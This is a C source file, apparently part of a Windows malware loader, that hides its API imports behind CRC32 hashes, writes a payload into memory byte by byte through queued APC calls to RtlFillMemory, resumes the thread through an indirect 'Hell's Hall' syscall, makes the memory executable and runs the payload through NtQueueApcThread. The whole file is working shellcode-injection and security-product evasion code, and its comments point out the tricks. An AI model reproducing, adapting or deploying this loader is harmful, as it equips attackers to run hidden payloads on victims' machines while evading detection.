#include <Windows.h>

#include "Structs.h"
#include "Common.h"
#include "HellsHall.h"
#include "Debug.h"

// 'NTAPIs' is defined and initialized in 'Unhook.c'
extern INDIRECT_SYSCALL NTAPIs;
DIRECT_CALLS WINAPIs = { 0 };

BOOL InitializeDirectCalls() {

	HMODULE hNtdll		= GetModuleHandleH(NTDLLDLL_CRC32a);
	HMODULE hKernel32	= GetModuleHandleH(KERNEL32DLL_CRC32a);
	
	if (!hNtdll || !hKernel32)
		return FALSE;


	WINAPIs.pNtAllocateVirtualMemory	= (fnNtAllocateVirtualMemory)GetProcAddressH(hNtdll, NtAllocateVirtualMemory_CRC32a);
	WINAPIs.pNtProtectVirtualMemory		= (fnNtProtectVirtualMemory)GetProcAddressH(hNtdll, NtProtectVirtualMemory_CRC32a);
	WINAPIs.pNtCreateThreadEx			= (fnNtCreateThreadEx)GetProcAddressH(hNtdll, NtCreateThreadEx_CRC32a);
	WINAPIs.pNtQueueApcThread			= (fnNtQueueApcThread)GetProcAddressH(hNtdll, NtQueueApcThread_CRC32a);
	WINAPIs.pNtWaitForMultipleObjects	= (fnNtWaitForMultipleObjects)GetProcAddressH(hNtdll, NtWaitForMultipleObjects_CRC32a);

	WINAPIs.pRtlFillMemory				= (PVOID)GetProcAddressH(hKernel32, RtlFillMemory_CRC32a);
	WINAPIs.pCreateToolhelp32Snapshot	= (fnCreateToolhelp32Snapshot)GetProcAddressH(hKernel32, CreateToolhelp32Snapshot_CRC32a);
	WINAPIs.pThread32First				= (fnThread32First)GetProcAddressH(hKernel32, Thread32First_CRC32a);
	WINAPIs.pThread32Next				= (fnThread32Next)GetProcAddressH(hKernel32, Thread32Next_CRC32a);
	WINAPIs.pCloseHandle				= (fnCloseHandle)GetProcAddressH(hKernel32, CloseHandle_CRC32a);

	// another trick ;)
	PVOID* ppElement = (PVOID*)&WINAPIs;
	for (int i = 0; i < sizeof(DIRECT_CALLS) / sizeof(PVOID); i++){
		if (!ppElement[i]) {
#ifdef DEBUG
			PRINTA("[!] InitializeDirectCalls Failed To Initialize Element Of Offset : %0.2d [Inject.c:13]\n", i);
#endif // DEBUG
			return FALSE;
		}
	}
	return TRUE;
}

// dummy function that will provide an alertable thread when executed (can be used to delay execution as well)
VOID AlertableFunc() {

	HANDLE hEvent = CreateEvent(NULL, 0, 0, NULL);
	if (hEvent) {
#ifdef DEBUG
		PRINTA("[i] Sleeping For %0.3d Sec ... ", (SLEEP / 1000));
#endif // DEBUG

		MsgWaitForMultipleObjectsEx(1, &hEvent, (DWORD)(SLEEP + 1000), QS_ALLINPUT, NULL);
		CloseHandle(hEvent);
#ifdef DEBUG
		PRINTA("[+] DONE \n");
#endif // DEBUG
	}

	ExitThread(0);
}

// function used to write the payload using 'NtQueueApcThread' and 'RtlFillMemory'
BOOL NtApcWrite(IN PBYTE pBuff, IN SIZE_T sLen, OUT LPVOID* ppAddress) {


	PVOID		pAddress		= NULL;
	HANDLE		hThread			= NULL;
	SIZE_T		sSize			= sLen;
	DWORD		dwOldProtection = 0x00;
	NTSTATUS	STATUS			= 0x00;


	if (!NT_SUCCESS(STATUS = WINAPIs.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), (LPVOID)AlertableFunc, NULL, TRUE, NULL, NULL, NULL, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx [ 0x%p ] Failed With Status : 0x%0.8X (Inject.c:76)\n", WINAPIs.pNtCreateThreadEx, STATUS);
#endif // DEBUG
		return FALSE;
	}


	if (!NT_SUCCESS(STATUS = WINAPIs.pNtAllocateVirtualMemory(NtCurrentProcess(), &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory [ 0x%p ] Failed With Status : 0x%0.8X (Inject.c:84)\n", WINAPIs.pNtAllocateVirtualMemory, STATUS);
#endif // DEBUG

		return FALSE;
	}

#ifdef DEBUG
	PRINTA("[+] Allocated Address : 0x%p \n", pAddress);
#endif // DEBUG


	for (size_t i = 0; i < sLen; i++) {

		/*
			- RCX: (PVOID)((PBYTE)pAddress + i)
			- RDX: 1
			- R8D: (PVOID)pBuff[i]
		*/

		if (!NT_SUCCESS(STATUS = WINAPIs.pNtQueueApcThread(hThread, WINAPIs.pRtlFillMemory, (PVOID)((PBYTE)pAddress + i), (PVOID)1, (PVOID)pBuff[i]))) {
#ifdef DEBUG
			PRINTA("[!] NtQueueApcThread [ 0x%p ] [ %0.3d - 0x%p ] Failed With Status : 0x%0.8X (Inject.c:105)\n", WINAPIs.pNtQueueApcThread, i, (PVOID)((PBYTE)pAddress + i), STATUS);
#endif // DEBUG
			return FALSE;
		}
	}

	// the only rop-syscall in this file; you can add it to the 'WINAPIs' structure, but its already initialized in 'NTAPIs' and im lazy
	INITIALIZE_SYSCALL(NTAPIs.NtResumeThread);
	if (!NT_SUCCESS(STATUS = HellHall(hThread, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtResumeThread Failed With Status : 0x%0.8X (Inject.c:116)\n", STATUS);
#endif // DEBUG
		return FALSE;
	}


	if (!NT_SUCCESS(STATUS = WINAPIs.pNtWaitForMultipleObjects(1, &hThread, WaitAllObject, TRUE, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForMultipleObjects [ 0x%p ] Failed With Status : 0x%0.8X (Inject.c:123)\n", WINAPIs.pNtWaitForMultipleObjects, STATUS);
#endif // DEBUG

		return FALSE;
	}

	if (!NT_SUCCESS(STATUS = WINAPIs.pNtProtectVirtualMemory(NtCurrentProcess(), &pAddress, &sLen, PAGE_EXECUTE_READWRITE, &dwOldProtection))) {
#ifdef DEBUG
		PRINTA("[!] NtProtectVirtualMemory [ 0x%p ] Failed With Status : 0x%0.8X (Inject.c:131)\n", WINAPIs.pNtProtectVirtualMemory, STATUS);
#endif // DEBUG

		return FALSE;
	}

	*ppAddress = pAddress;

	return TRUE;
}




// function used to run the payload via 'NtQueueApcThread' 
BOOL RunViaNtApc(IN LPVOID pAddress) {

	HANDLE		hThread = NULL;
	NTSTATUS	STATUS	= 0x00;

	if (!NT_SUCCESS(STATUS = WINAPIs.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), (LPVOID)AlertableFunc, NULL, FALSE, NULL, NULL, NULL, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx [ 0x%p ] Failed With Status : 0x%0.8X (Inject.c:153)\n", WINAPIs.pNtCreateThreadEx, STATUS);
#endif // DEBUG
		return FALSE;
	}

	if (!NT_SUCCESS(STATUS = WINAPIs.pNtQueueApcThread(hThread, pAddress, NULL, NULL, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtQueueApcThread [ 0x%p ] Failed With Status : 0x%0.8X (Inject.c:160)\n", WINAPIs.pNtQueueApcThread, STATUS);
#endif // DEBUG
		return FALSE;
	}

	if (!NT_SUCCESS(STATUS = WINAPIs.pNtWaitForMultipleObjects(1, &hThread, WaitAllObject, TRUE, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForMultipleObjects [ 0x%p ] Failed With Status : 0x%0.8X (Inject.c:167)\n", WINAPIs.pNtWaitForMultipleObjects, STATUS);
#endif // DEBUG
		return FALSE;
	}

	return TRUE;
}

